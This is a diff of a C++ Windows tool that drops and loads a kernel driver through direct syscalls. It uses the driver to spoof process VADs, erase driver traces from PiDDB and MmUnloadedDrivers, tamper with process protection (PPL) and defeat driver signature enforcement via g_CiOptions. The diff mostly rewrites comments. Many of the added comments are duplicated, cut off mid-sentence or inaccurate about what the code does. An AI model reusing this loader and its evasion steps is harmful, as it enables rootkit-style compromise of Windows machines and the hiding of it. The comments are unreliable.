@@ -13,14 +13,10 @@
 
 #pragma comment(lib, "shell32.lib")
 
-// --- application open procedure -------------------------------------------
-//
-// Opening the executable by double-clicking goes through the shell instead of
-// an already-open (and usually already-elevated) terminal. The startup path
-// must guarantee that:
-//   1. a visible console exists before the first printf,
-//   2. the process actually holds an elevated token, and
-//   3. an early failure does not make the console vanish before it is read.
+// Double-clicking goes through the shell, not an already-elevated terminal, so
+// startup must guarantee: a visible console before the first printf, an
+// elevated token, and that an early failure leaves the console up long enough
+// to be read.
 
 static bool IsElevated() {
     HANDLE token = NULL;
@@ -50,6 +46,7 @@ static void EnsureConsole() {
     setvbuf(stdout, NULL, _IONBF, 0);
     setvbuf(stderr, NULL, _IONBF, 0);
 
+	// Bring the console to the front, in case it was already open but hidden behind other windows.
     HWND console = GetConsoleWindow();
     if (console) {
         ShowWindow(console, SW_SHOWNORMAL);
@@ -57,6 +54,8 @@ static void EnsureConsole() {
     }
 }
 
+// RelaunchElevated() is only called when the process is not elevated, so it is safe to use ShellExecuteExW() with the "runas" verb. 
+// The function returns true
 static bool RelaunchElevated() {
     wchar_t exePath[MAX_PATH] = {};
     if (!GetModuleFileNameW(NULL, exePath, MAX_PATH))
@@ -84,21 +83,17 @@ static bool RelaunchElevated() {
     return true;
 }
 
-// --- crash reporting -------------------------------------------------------
-//
-// The window/VAD work faults on purpose (the VADs behind the 1 GiB views are
-// deliberately truncated), so a failure there used to take the process down with
-// an unhandled STATUS_ACCESS_VIOLATION: the console closed and the only trace
-// was in the system log. Every phase is tagged and Run() traps the exception
-// so a crash says where it happened, then puts the VAD tree back the way it
-// was - a process that exits with a truncated VAD still backed by a live
-// section is a bugcheck waiting to happen in the section teardown path.
-
+// The window/VAD work truncates VADs on purpose, so a fault there used to end the
+// process with an unhandled STATUS_ACCESS_VIOLATION: the console closed and the
+// only trace was in the system log. Every phase is tagged and Run() traps the
+// exception, then restores the VAD tree - exiting with a truncated VAD still
+// backed by a live section is a bugcheck waiting for the teardown path.
 enum RunPhase {
     PH_STARTUP, PH_DROP, PH_LOAD, PH_WINDOW, PH_SPOOF, PH_CLEANUP,
     PH_UNLOAD, PH_RESTORE, PH_PPL, PH_VERIFY, PH_DSE, PH_DACL, PH_DONE
 };
 
+// The last exception is stored so the sweep can report it with the same detail
 static RunPhase g_Phase = PH_STARTUP;
 static EXCEPTION_POINTERS* g_LastException = NULL;
 
@@ -129,6 +124,8 @@ static void RawWrite(const char* text) {
     WriteFile(h, text, (DWORD)lstrlenA(text), &written, NULL);
 }
 
+// The exception filter is called from the __except clause, so it can return EXCEPTION_EXECUTE_HANDLER to run the handler, or EXCEPTION_CONTINUE_SEARCH to let the exception propagate. 
+// It stores the exception pointers for later reporting.
 static int CrashFilter(EXCEPTION_POINTERS* ep) {
     g_LastException = ep;
     return EXCEPTION_EXECUTE_HANDLER;
@@ -154,14 +151,10 @@ static void PrintCrashDetail(const char* what) {
         rip = (ULONG64)g_LastException->ContextRecord->Rip;
     }
     char buf[400] = {};
-    // wsprintfA is a legacy Win32 formatter and does not understand %ll: it
-    // parses "%llX" as "%l" followed by literal "lX", which consumes one
-    // argument and shifts every argument after it. Split 64-bit values into
-    // high and low dwords instead.
-    //
-    // A RIP inside our own image is only useful relative to the image base, so
-    // report that too - it turns "crashed somewhere in the exe" into an offset
-    // that resolves against the module.
+    // wsprintfA does not understand %ll: it parses "%llX" as "%l" plus literal
+    // "lX", consuming one argument and shifting every argument after it. Split
+    // 64-bit values into dwords. A RIP in our own image is also only useful
+    // relative to the image base, so report that too.
     ULONG64 selfBase = (ULONG64)(UINT_PTR)GetModuleHandleA(NULL);
     ULONG64 rel = (selfBase && rip >= selfBase && rip < selfBase + 0x01000000ULL)
                     ? rip - selfBase : 0;
@@ -175,6 +168,8 @@ static void PrintCrashDetail(const char* what) {
     RawWrite(buf);
 }
 
+// The exception handler is called from the __except clause, so it can only call functions that are safe to run from an exception handler. 
+// It reports the exception and restores any VADs that were truncated, so the process can exit cleanly.
 static void ReportCrash() {
     ULONG patches = (ULONG)WindowVadPatchCount();
     PrintCrashDetail("the run");
@@ -214,6 +209,8 @@ static int Run() {
     }
 }
 
+// RunBody() is the main body of the run, with all the steps that can fault. 
+// It is split out so the exception filter can be set up in Run(), and so the sweep can report the same detail as the top level.
 static int RunBody() {
     printf("[*] tpwsav\n\n");
 
@@ -248,24 +245,28 @@ static int RunBody() {
     }
 
     // The DSE step needs ci.dll!g_CiOptions' RVA, and finding it means
-    // downloading that module's PDB and running DIA over it - by far the most
-    // memory-hungry step in the loader. Do it now, while memory is still
-    // plentiful: after the physical window has committed its gigabytes the same
-    // work can fail with STATUS_NO_MEMORY, which is what it did under HVCI.
+    // downloading that PDB and running DIA over it - the most memory-hungry
+    // thing here. Do it now, while memory is plentiful: after the window has
+    // committed its gigabytes the same work can fail with STATUS_NO_MEMORY.
     ULONG64 ciOptionsRva = 0;
     bool haveCiOptionsRva = ResolveCiOptionsRva(&ciOptionsRva);
 
+	// The driver drop and load steps need SeLoadDriverPrivilege, so enable it now. 
+    // The privilege is not needed for the rest of the run, so it is not left enabled.
     printf("\n[*] Enabling SeLoadDriverPrivilege...\n");
     {
         HANDLE tokenHandle;
         OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tokenHandle);
 
+		// The privilege is enabled for the current process, so it is inherited by the driver load thread. 
+        // The privilege is not needed for the rest of the run, so it is not left enabled.
         TOKEN_PRIVILEGES tp = {};
         LookupPrivilegeValueW(NULL, SE_LOAD_DRIVER_NAME, &tp.Privileges[0].Luid);
         tp.PrivilegeCount = 1;
         tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
         AdjustTokenPrivileges(tokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);
 
+		// AdjustTokenPrivileges() always returns TRUE, so check GetLastError() to see if it actually succeeded.
         if (GetLastError() != 0) {
             printf("[-] Failed to enable SeLoadDriverPrivilege\n");
             return 1;
@@ -274,30 +275,40 @@ static int RunBody() {
         printf("[+] SeLoadDriverPrivilege enabled\n");
     }
 
+	// The driver is dropped to a temp file with a name based on the tick count, so that two runs in a row do not collide. 
+    // The file is created with FILE_OVERWRITE_IF so that if the same tick count is used twice in a row, the second run will overwrite the first file instead of failing to create it.
     printf("\n[*] Dropping driver to temp...\n");
     g_Phase = PH_DROP;
 
+	// The temp path is used to avoid any permission issues, and the file is deleted after the driver is loaded.
     wchar_t tempDir[MAX_PATH] = {};
     GetTempPathW(MAX_PATH, tempDir);
 
+	// Use the tick count to generate a unique name for the driver file. 
+    // This helps avoid collisions if the tool is run multiple times in quick succession.
     DWORD tick = (DWORD)GetTickCount64();
     wchar_t svcName[32] = {};
     wsprintfW(svcName, L"tmp%X", tick);
 
+	// The driver is dropped to a temp file with a name based on the tick count, so that two runs in a row do not collide.
     wchar_t dropPath[MAX_PATH] = {};
     wsprintfW(dropPath, L"%s%s.sys", tempDir, svcName);
 
+	// The driver bytes are written to the temp file. If the write fails, the tool exits with an error.
     wchar_t ntPath[MAX_PATH] = {};
     wsprintfW(ntPath, L"\\??\\%s", dropPath);
 
+	// The driver is dropped to a temp file with a name based on the tick count, so that two runs in a row do not collide.
     HANDLE fileHandle = NULL;
     IO_STATUS_BLOCK ioStatus = {};
     UNICODE_STRING filePath;
     OBJECT_ATTRIBUTES fileAttrs;
 
+	// The driver is dropped to a temp file with a name based on the tick count, so that two runs in a row do not collide.
     InitUnicodeString(&filePath, ntPath);
     InitializeObjectAttributes(&fileAttrs, &filePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
+	// The file is created with FILE_OVERWRITE_IF so that if the same tick count is used twice in a row, the second run will overwrite the first file instead of failing to create it.
     NTSTATUS status = DoSyscallEx(
         sc.NtCreateFile,
         (ULONG_PTR)&fileHandle,
@@ -313,11 +324,13 @@ static int RunBody() {
         (ULONG_PTR)0
     );
 
+	// The file is created with FILE_OVERWRITE_IF so that if the same tick count is used twice in a row, the second run will overwrite the first file instead of failing to create it.
     if (status != 0) {
         printf("[-] Failed to create temp file: 0x%lX\n", status);
         return 1;
     }
 
+	// The driver bytes are written to the temp file. If the write fails, the tool exits with an error.
     ioStatus = {};
     status = DoSyscallEx(
         sc.NtWriteFile,
@@ -333,27 +346,32 @@ static int RunBody() {
         0, 0
     );
 
+	// The file handle is closed after the write operation.
     DoSyscall(sc.NtClose, (ULONG_PTR)fileHandle, 0, 0, 0);
 
     if (status != 0) {
         printf("[-] Failed to write driver bytes: 0x%lX\n", status);
         return 1;
     }
+
+	// The driver is dropped to a temp file with a name based on the tick count, so that two runs in a row do not collide.
     printf("[+] Dropped %u bytes\n", g_DriverSize);
 
+	// The service registry key is created for the driver.
     printf("\n[*] Creating service registry key...\n");
-
     UNICODE_STRING keyPath;
     wchar_t svcRegPath[MAX_PATH] = {};
     wsprintfW(svcRegPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%s", svcName);
     InitUnicodeString(&keyPath, svcRegPath);
 
+	// The service registry key is created for the driver.
     OBJECT_ATTRIBUTES keyAttrs;
     InitializeObjectAttributes(&keyAttrs, &keyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
     HANDLE keyHandle = NULL;
     ULONG disposition = 0;
 
+	// The service registry key that is created for the driver.
     status = DoSyscallEx(
         sc.NtCreateKey,
         (ULONG_PTR)&keyHandle,
@@ -374,6 +392,7 @@ static int RunBody() {
     UNICODE_STRING imagePathName;
     InitUnicodeString(&imagePathName, L"ImagePath");
 
+	// The ImagePath value is set to the path of the driver file.
     status = DoSyscallEx(
         sc.NtSetValueKey,
         (ULONG_PTR)keyHandle,
@@ -390,6 +409,7 @@ static int RunBody() {
         return 1;
     }
 
+    // The Type value is set to 1 (kernel-mode driver).
     UNICODE_STRING typeName;
     InitUnicodeString(&typeName, L"Type");
     DWORD driverType = 1;
@@ -411,8 +431,12 @@ static int RunBody() {
         printf("[-] Failed to set Type: 0x%lX\n", status);
         return 1;
     }
+
+	// The service registry key is created for the driver.
     printf("[+] Service key created\n");
 
+	// The driver is loaded using NtLoadDriver. 
+    // If the driver is already loaded, it will reuse the existing driver.
     printf("\n[*] Loading driver...\n");
     g_Phase = PH_LOAD;
 
@@ -443,6 +467,7 @@ static int RunBody() {
     UNICODE_STRING devicePath;
     OBJECT_ATTRIBUTES deviceAttrs;
 
+	// The device path is set to the symbolic link created by the driver.
     InitUnicodeString(&devicePath, L"\\DosDevices\\EBIoDispatch");
     InitializeObjectAttributes(&deviceAttrs, &devicePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
@@ -469,6 +494,7 @@ static int RunBody() {
 
     printf("\n[*] Finding System CR3...\n");
 
+	// The System CR3 is the page table base for the kernel. It is needed to access kernel memory and manipulate VADs.
     ULONG64 systemCr3 = FindSystemCr3(deviceHandle, &sc, kOffsets.NtoskrnlBase);
     if (!systemCr3) {
         printf("[-] Failed to find System CR3\n");
@@ -482,9 +508,12 @@ static int RunBody() {
         return 1;
     }
 
+	// The VAD spoofing step modifies the VADs of the current process to claim a large section of memory, which is used to bypass certain security checks. 
+    // This is done through the physical memory window set up earlier.
     g_Phase = PH_SPOOF;
     SpoofWindowVADs(deviceHandle, &sc, systemCr3, &kOffsets);
 
+	// The PiDDB and MmUnloadedDrivers cleanup step removes traces of the driver from the system.
     g_Phase = PH_CLEANUP;
     printf("\n[*] Trace cleanup\n");
 
@@ -496,14 +525,14 @@ static int RunBody() {
     bool mmPrepared = PrepareMmCleanup(deviceHandle, &sc, systemCr3, &kOffsets,
                                       driverFileName, &mmCtx);
 
-    // Put the VADs back now, before anything else touches the window again
-    // (PPL, DSE, verification). A VAD tree that claims 64 KiB for a 1 GiB section
-    // is exactly what makes those steps fault, and restoring here means the
-    // process can never exit - cleanly or not - with a truncated VAD still in
-    // place.
+    // Put the VADs back before anything else touches the window again (PPL, DSE,
+    // verification): a VAD claiming 64 KiB for a 1 GiB section is what makes those
+    // steps fault, and this way the process can never exit - cleanly or not -
+    // with a truncated VAD in place.
     g_Phase = PH_RESTORE;
     RestorePhysWindow();
 
+    // The driver is unloaded using NtUnloadDriver.
     g_Phase = PH_UNLOAD;
     printf("\n[*] Unloading driver...\n");
     DoSyscall(sc.NtClose, (ULONG_PTR)deviceHandle, 0, 0, 0);
@@ -514,6 +543,7 @@ static int RunBody() {
     if (mmPrepared && status == 0)
         FinishMmCleanup(&mmCtx);
 
+	// The service registry key is deleted after the driver is unloaded.
     InitializeObjectAttributes(&keyAttrs, &keyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
     status = DoSyscallEx(
         sc.NtCreateKey,
@@ -573,6 +603,8 @@ static int RunBody() {
     }
 
     {
+		// PPL is a process-wide setting, so NtQueryInformationProcess is the only way to read it back. 
+        // The physical memory window can only read the current process' EPROCESS.
         typedef NTSTATUS(WINAPI* fnNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
         auto NtQIP = (fnNtQIP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
         if (NtQIP) {
